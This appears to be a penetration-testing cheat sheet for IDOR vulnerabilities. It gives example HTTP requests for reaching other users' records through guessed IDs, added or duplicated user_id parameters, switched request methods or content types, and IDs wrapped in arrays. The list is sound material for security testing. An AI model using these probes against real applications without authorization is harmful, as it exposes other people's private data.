# IDOR

**1. Don’t ignore encoded and hashed IDs**

if the application is using a hashed/ randomized ID, see if the ID is predictable. Sometimes applications use algorithms that produce insufficient entropy, and as such, the IDs can actually be predicted after careful analysis.
```html
GET /api_v1/messages?conversation_id=SOME_RANDOM_ID

```
```html
GET /api_v1/messages?user_id=ANOTHER_USERS_ID

```

**2. If you can’t guess it, try creating it**

object reference IDs.

**3. Offer the application an ID, even if it doesn’t ask for it**

id, user_id, message_id,...
```javascript
GET /api_v1/messages

// What about this one? Would it display another user’s messages instead?

GET /api_v1/messages?user_id=ANOTHER_USERS_ID

```

**4. HPP (HTTP parameter pollution)**

HPP vulnerabilities (supplying multiple values for the same parameter) can also lead to IDOR. Applications might not anticipate the user submitting multiple values for the same parameter and by doing so, you might be able to bypass the access control set forth on the endpoint.
```javascript
// if
GET /api_v1/messages?user_id=ANOTHER_USERS_ID

// try this
GET /api_v1/messages?user_id=YOUR_USER_ID&user_id=ANOTHER_USERS_ID

// or this
GET /api_v1/messages?user_id=ANOTHER_USERS_ID&user_id=YOUR_USER_ID

// Or provide the parameters as a list
GET /api_v1/messages?user_ids[]=YOUR_USER_ID&user_ids[]=ANOTHER_USERS_ID

// The value of a parameter is used directly to retrieve a file system resource
GET /showImage?img=img00011



```

**5. Blind IDORs**

They might lead the application to leak information elsewhere instead: in export files, emails and maybe even text alerts.

**6. Change the request method**

try instead: `GET`, `POST`, `PUT`, `DELETE`, `PATCH`…

A common trick that works is substituting `POST` for `PUT` or vice versa.

**7. Change the requested file type (content type)**

For example, try adding `.json` to the end of the request URL and see what happens.

**8. Transform numerical values to arrays**

`{"id":19} → {"id":[19]}`









